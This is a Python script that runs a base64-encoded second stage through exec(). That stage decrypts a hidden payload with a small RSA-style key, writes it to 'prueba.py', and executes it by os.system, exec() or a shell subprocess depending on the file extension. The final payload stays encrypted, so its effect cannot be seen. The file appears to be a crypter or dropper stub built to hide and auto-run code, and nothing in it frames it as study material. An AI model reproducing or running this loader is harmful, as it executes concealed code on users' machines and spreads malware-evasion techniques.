import base64
data = b'aW1wb3J0IGFyZ3BhcnNlLCBtYXRoLCBiYXNlNjQsIGJpbmFzY2lpLCByYW5kb20sIHN5cywgc3VicHJvY2Vzcywgb3MKZnJvbSByYW5kb20gaW1wb3J0IHJhbmRpbnQKY2R4ID0gIk9HTT1PREF4TXpFMk4yRXdPR009TVRVd05tSmpOMkV3T0dNPU1UWXpPREV5TjJFd09HTT1Oamc0T0RRNU4yRXdPR009T0RBeE9Ea3lOMkV3T0dNPU1tWTROVFU9TjJFd09HTT1NMlF5T0RFeU4yRXdPR009TW1ZNE5HUTBOMkV3T0dNPU1UWXpPREV5TjJFd016RTJOamc0T0RreU4yRXdPR009T0RBeE5tSmpOMkV3T0dNPU5qZzROR1EwTjJFd09HTT1PREF4T0RreU4yRXdPR009TVRVd09ETTNOMkV3T0dNPU1UVXdOVFU9TjJFd09HTT1Oamc0TXpFMk4yRXdPR009TVRVd05tSXlOMkV3T0dNPU1UVXdObUpqTjJFd09HTT1NMlF5T0RreU4yRXdPR009TW1ZNE16RTJOMkV3T0dNPU1UVXdObUl5TjJFd09HTT1NVFV3T0RNM04yRXdPR009T0RBeE5tSmpOMkV3T0dNPU1tWTRNekUyTjJFd09HTT1NVFV3Tm1JeU4yRXdPR009TVRVd09ETTNOMkV3T0dNPU9EQXhObUpqTjJFd09HTT1PREF4Tm1Kak4yRXdPR009TTJReU5tSXlOMkV3TXpFMk5qZzRPRGt5TjJFd09HTT1Oamc0TVRRd04yRXdPR009TW1ZNE16RTJOMkV3T0dNPU0yUXlObUl5TjJFd09HTT1NMlF5T0RNM04yRXdPR009TTJReU9Ea3lOMkV3T0dNPU5qZzROR1EwTjJFd09HTT1NVFV3Tm1JeU4yRXdPR009TVRVd01UUXdOMkV3T0dNPU1tWTROR1EwTjJFd09HTT1Oamc0T0RRNU4yRXdPR009TVRZek9ERXlOMkV3T0dNPU5qZzRObUl5TjJFd09HTT1NbVk0T0RreU4yRXdNekUyTldZNU1UUXdOMkV3IgpkcnBubSA9ICJwcnVlYmEucHkiCnBrID0gKDY3MSwgMjIwMSkKCmRlZiBkY3kocGssIGNwdHgpOgoJaywgbiA9IHBrCgltZW5zYWplUmVjaWJpZG8gPSBfX3JlQmE2NF9fKGNwdHguZW5jb2RlKCd1dGYtOCcpKQoJbWVuc2FqZUhleFJlY2liaWRvID0gX19iYTY0SGV4X18obWVuc2FqZVJlY2liaWRvKQoJbWVuc2FqZURlY2ltYWxSZWNpYmlkbyA9IF9faGV4RGVjX18obWVuc2FqZUhleFJlY2liaWRvKQoJbWVuc2FqZURlc2NpZnJhZG8gPSBbKChjICoqIGspICUgbikgZm9yIGMgaW4gbWVuc2FqZURlY2ltYWxSZWNpYmlkb10KCW1lbnNhamVfZGVfYXNjaWkgPSBfX2RlQVNfXyhtZW5zYWplRGVzY2lmcmFkbykKCWRlY2FzYyA9IF9fcmVCYTY0X18oJycuam9pbihtZW5zYWplX2RlX2FzY2lpKS5lbmNvZGUoKSkKCWhleGJhNjQgPSBfX2JhNjRIZXhfXyhkZWNhc2MpCglhc2hleCA9IF9faGV4RGVjX18oaGV4YmE2NCkKCWRlYXNjID0gX19kZUFTX18oYXNoZXgpCgliYTY0ID0gYmFzZTY0LmI2NGRlY29kZShkZWFzYy5lbmNvZGUoKSkKCXJldHVybiBiYTY0CmRlZiBfX3JlQmE2NF9fKG0pOgoJbUJhNjQgPSBbbVtpOmkrNF0gZm9yIGkgaW4gcmFuZ2UoMCwgbGVuKG0pLCA0KV0KCXJldHVybiBtQmE2NApkZWYgX19iYTY0SGV4X18obSk6CgltSHggPSBbYmFzZTY0LmI2NGRlY29kZShiNjQpIGZvciBiNjQgaW4gbV0KCXJldHVybiBtSHgKZGVmIF9faGV4RGVjX18obSk6CgltRGVjID0gW2ludChoZXhhLmRlY29kZSgiVVRGLTgiKSwgMTYpIGZvciBoZXhhIGluIG1dCglyZXR1cm4gbURlYwpkZWYgX19kZUFTX18obSk6CgltMSA9ICcnLmpvaW4oW2NocihkKSBmb3IgZCBpbiBtXSkKCXJldHVybiBtMQpkZWYgX19tZUFTX18obSk6CgltZW4gPSBbb3JkKHApIGZvciBwIGluIG1dCglyZXR1cm4gbWVuCmRjeV9kYXRhID0gZGN5KHBrPXBrLCBjcHR4PWNkeCkKCmltYWdlX2V4dGVuc2lvbnMgPSAoJ2pwZycsICdqcGVnJywgJ2JwbScsICdpY28nLCAncG5nJykKZXhlY19leHRlbnNpb25zID0gKCdiYXQnLCAnZXhlJywgJ3ZicycsICdwczEnKQpweXRob25fZXh0ZW5zaW9ucyA9ICgncHknKQpuZiA9IG9wZW4oZHJwbm0sICd3YicpCnRyeToKCW5mLndyaXRlKGRjeV9kYXRhKQpleGNlcHQ6CglwYXNzCm5mLmNsb3NlKCkKaWYgb3MucGF0aC5leGlzdHMoZHJwbm0pOgoJaWYgZHJwbm0uc3BsaXQoJy4nKVsxXSBpbiBpbWFnZV9leHRlbnNpb25zOgoJCWltYWdlVmlld2VyRnJvbUNvbW1hbmRMaW5lID0geydsaW51eCc6J3hkZy1vcGVuJywgJ3dpbjMyJzonZXhwbG9yZXInLCAnZGFyd2luJzonb3Blbid9W3N5cy5wbGF0Zm9ybV0KCQlzdWJwcm9jZXNzLnJ1bihbaW1hZ2VWaWV3ZXJGcm9tQ29tbWFuZExpbmUsIGRycG5tXSwgY2xvc2VfZmRzPVRydWUpCglpZiBkcnBubS5zcGxpdCgnLicpWzFdIGluIGV4ZWNfZXh0ZW5zaW9ucyBhbmQgc3lzLnBsYXRmb3JtID09ICd3aW4zMic6CgkJb3Muc3lzdGVtKGRycG5tKQoJaWYgZHJwbm0uc3BsaXQoJy4nKVsxXSBpbiBweXRob25fZXh0ZW5zaW9uczoKCQlleGVjKGRjeV9kYXRhKQoJCXByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKCdweXRob24ge2ZufScuZm9ybWF0KGZuPWRycG5tKSwgc2hlbGw9VHJ1ZSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5QSVBFKQo='
exec(base64.b64decode(data))